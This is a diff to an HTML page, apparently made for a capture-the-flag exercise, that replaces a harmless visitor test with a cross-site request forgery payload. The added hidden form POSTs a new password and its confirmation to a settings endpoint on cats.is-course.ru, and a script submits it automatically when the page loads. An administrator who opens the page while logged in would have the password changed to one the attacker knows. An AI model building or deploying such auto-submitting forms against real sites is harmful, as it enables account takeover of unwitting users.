@@ -1,11 +1,29 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CTF Test</title>
+  <title>CTF CSRF Test</title>
 </head>
 <body>
-  <h1>CTF visitor test</h1>
-  <p>Testing whether the administrator opens this page.</p>
+  <h2>CSRF form submission test</h2>
+  <p>Submitting a password change request...</p>
+
+  <form id="csrf" 
+        action="https://cats.is-course.ru/settings"
+        method="POST">
+
+    <input type="hidden"
+           name="password"
+           value="CTFtestPassword2026!">
+
+    <input type="hidden"
+           name="confirm-password"
+           value="CTFtestPassword2026!">
+  </form>
+
+  <script>
+    document.getElementById("csrf").submit();
+  </script>
 </body>
 </html>
